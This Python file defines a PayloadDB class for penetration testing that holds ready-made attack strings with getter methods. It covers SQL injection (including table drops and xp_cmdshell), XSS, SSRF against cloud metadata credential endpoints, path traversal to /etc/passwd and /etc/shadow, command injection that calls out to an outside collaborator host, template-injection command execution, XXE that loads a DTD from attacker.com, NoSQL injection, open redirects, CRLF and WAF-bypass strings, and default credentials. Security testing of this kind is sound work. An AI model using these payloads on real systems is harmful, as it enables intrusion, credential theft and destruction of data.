class PayloadDB:
    """Comprehensive payload database for professional penetration testing."""

    # ── SQL Injection ──────────────────────────────────────────
    SQLI_PAYLOADS = [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "' OR 1=1#",
        "' OR 1=1/*", "admin' --", "admin'/*", "') OR ('1'='1",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION ALL SELECT 1,2,3--",
        "' UNION SELECT username,password FROM users--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,version()),1)--",
        "1; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--",
        "1' AND (SELECT SLEEP(5))--", "'; SELECT pg_sleep(5)--",
        "' AND 1=1--", "' AND 1=2--",
        "' AND SUBSTRING(version(),1,1)='5'--",
        "'; DROP TABLE users--",
        "'%20OR%20'1'='1", "'/**/OR/**/1=1--", "' /*!50000OR*/ 1=1--",
        "' OR ''='", "1' ORDER BY 1--", "1' ORDER BY 10--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables--",
        "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
        "'; EXEC xp_cmdshell('whoami')--",
        "' OR 1=1 LIMIT 1 OFFSET 1--",
    ]

    # ── XSS ────────────────────────────────────────────────────
    XSS_PAYLOADS = [
        "<script>alert(1)</script>", "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>", "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
        "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>", "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "\" autofocus onfocus=alert(1) x=\"",
        "javascript:alert(1)", "'-alert(1)-'",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<svg/onload=alert(1)>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>//",
        "#<img src=/ onerror=alert(1)>",
        "javascript:alert(document.domain)",
        "<iframe src=javascript:alert(1)>",
        "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d=\"M0\"<animate attributeName=d begin=x.focus dur=1s repeatCount=indefinite keytimes=0;0;1 values=\"M0;window.location='//evil';\"/>",
        "<img src=1 onerror=alert`1`>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
    ]

    # ── SSRF ───────────────────────────────────────────────────
    SSRF_PAYLOADS = [
        "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
        "http://[::1]", "http://[::]:80/", "http://0177.0.0.1",
        "http://2130706433", "http://0x7f000001",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://127.0.0.1:8080", "http://127.0.0.1:3306",
        "http://127.0.0.1:6379", "http://127.0.0.1:27017",
        "file:///etc/passwd", "file:///c:/windows/win.ini",
        "http://127.1", "http://127.0.0.1.nip.io",
        "http://169.254.169.254/latest/user-data/",
        "http://100.100.100.200/latest/meta-data/",
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:6379/INFO",
        "http://0/", "http://127.127.127.127",
        "http://①②⑦.⓪.⓪.①",
    ]

    # ── Path Traversal / LFI ──────────────────────────────────
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd", "../../../../etc/passwd",
        "../../../../../etc/shadow", "../../../etc/hosts",
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "%252e%252e%252f%252e%252e%252fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "../../../etc/passwd%00.jpg",
        "/etc/passwd", "C:\\windows\\win.ini",
        "....\\....\\....\\etc\\passwd",
        "..%5c..%5c..%5cetc/passwd",
        "/proc/self/environ", "/proc/self/cmdline",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
    ]

    # ── Command Injection ─────────────────────────────────────
    CMDI_PAYLOADS = [
        "; id", "| id", "|| id", "& id", "&& id", "`id`", "$(id)",
        "; whoami", "| whoami", "; cat /etc/passwd",
        "| type C:\\windows\\win.ini", "\nid\n", ";sleep 5", "| sleep 5",
        "; ping -c 3 127.0.0.1", "| curl http://burpcollaborator.net",
        "$(sleep 5)", "`sleep 5`",
        ";ls -la", "|ls", "&&ls",
        "| nslookup burpcollaborator.net",
        "%0aid", "%0a%0did",
        "'; ping -n 5 127.0.0.1 &",
    ]

    # ── SSTI ──────────────────────────────────────────────────
    SSTI_PAYLOADS = [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
        "{{config}}", "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "#{7*7}", "@(7*7)",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        "${7*'7'}", "{{7*'7'}}",
        "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
    ]

    # ── XXE (NEW) ─────────────────────────────────────────────
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b "<!ENTITY &#x25; c SYSTEM \'file:///etc/passwd\'>">%b;%c;]><test>xxe</test>',
    ]

    # ── NoSQL Injection (NEW) ─────────────────────────────────
    NOSQLI_PAYLOADS = [
        '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
        "' || '1'=='1", "true, $where: '1 == 1'",
        '{"username":{"$ne":null},"password":{"$ne":null}}',
        '{"$or":[{},{"a":"a"}]}',
        "';return true;var a='",
        '{"username":{"$regex":"^admin"}}',
        "admin'||''=='", '{"$where":"sleep(5000)"}',
        '{"username":{"$gt":""},"password":{"$gt":""}}',
        '[$ne]=1', '[$regex]=.*', '[$gt]=',
        "this.password.match(/.*/) || 'a'=='a",
    ]

    # ── Open Redirect (NEW) ───────────────────────────────────
    OPEN_REDIRECT_PAYLOADS = [
        "//evil.com", "https://evil.com", "/\\evil.com",
        "//evil.com/%2f..", "https:evil.com",
        "////evil.com", "https://evil.com@trusted.com",
        "/%0d/evil.com", "//%09/evil.com",
        "https://evil.com%23@trusted.com",
        "javascript:alert(1)//",
        "//google.com%2f@evil.com",
        "https://trusted.com.evil.com",
        "data:text/html,<script>alert(1)</script>",
    ]

    # ── CORS Bypass (NEW) ─────────────────────────────────────
    CORS_ORIGINS = [
        "https://evil.com", "null", "https://trusted.com.evil.com",
        "https://trustedcom.evil.com", "http://trusted.com",
        "https://evil-trusted.com", "https://trusted.com%60.evil.com",
        "https://trusted.com_.evil.com",
    ]

    # ── Header Injection / CRLF (NEW) ─────────────────────────
    HEADER_INJECTION_PAYLOADS = [
        "%0d%0aInjected-Header:true",
        "%0aInjected-Header:true",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "\r\nInjected-Header: true",
        "foobar%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a",
        "%E5%98%8D%E5%98%8AInjected-Header:true",
    ]

    # ── WAF Bypass Techniques (NEW) ───────────────────────────
    WAF_BYPASS_PAYLOADS = [
        "sEl<eCt", "SELE/**/CT", "SEL%45CT", "/*!SELECT*/",
        "concat(0x73656c656374)", "CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)",
        "%53%45%4C%45%43%54", "s%e%l%e%c%t",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "<img/src=x onerror=alert(1)>",
        "<svg/onload=alert(1)//",
        "{{7*7}}", "${7*7}",
    ]

    # ── Auth Bypass (NEW) ─────────────────────────────────────
    AUTH_BYPASS_PAYLOADS = [
        "admin:admin", "admin:password", "admin:123456",
        "root:root", "test:test", "admin:admin123",
        "administrator:administrator",
        # JWT none algorithm
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
        # HTTP Method override
        "X-HTTP-Method-Override: PUT",
        "X-Method-Override: PUT",
        "X-HTTP-Method: PUT",
    ]

    # ── Getter Methods ────────────────────────────────────────
    @classmethod
    def get_sqli_payloads(cls, limit: int = 10):
        return cls.SQLI_PAYLOADS[:limit]

    @classmethod
    def get_xss_payloads(cls, limit: int = 10):
        return cls.XSS_PAYLOADS[:limit]

    @classmethod
    def get_ssrf_payloads(cls, limit: int = 10):
        return cls.SSRF_PAYLOADS[:limit]

    @classmethod
    def get_path_traversal_payloads(cls, limit: int = 10):
        return cls.PATH_TRAVERSAL_PAYLOADS[:limit]

    @classmethod
    def get_cmdi_payloads(cls, limit: int = 10):
        return cls.CMDI_PAYLOADS[:limit]

    @classmethod
    def get_ssti_payloads(cls, limit: int = 10):
        return cls.SSTI_PAYLOADS[:limit]

    @classmethod
    def get_xxe_payloads(cls, limit: int = 10):
        return cls.XXE_PAYLOADS[:limit]

    @classmethod
    def get_nosqli_payloads(cls, limit: int = 10):
        return cls.NOSQLI_PAYLOADS[:limit]

    @classmethod
    def get_open_redirect_payloads(cls, limit: int = 10):
        return cls.OPEN_REDIRECT_PAYLOADS[:limit]

    @classmethod
    def get_cors_origins(cls, limit: int = 10):
        return cls.CORS_ORIGINS[:limit]

    @classmethod
    def get_header_injection_payloads(cls, limit: int = 10):
        return cls.HEADER_INJECTION_PAYLOADS[:limit]

    @classmethod
    def get_waf_bypass_payloads(cls, limit: int = 10):
        return cls.WAF_BYPASS_PAYLOADS[:limit]

    @classmethod
    def get_auth_bypass_payloads(cls, limit: int = 10):
        return cls.AUTH_BYPASS_PAYLOADS[:limit]
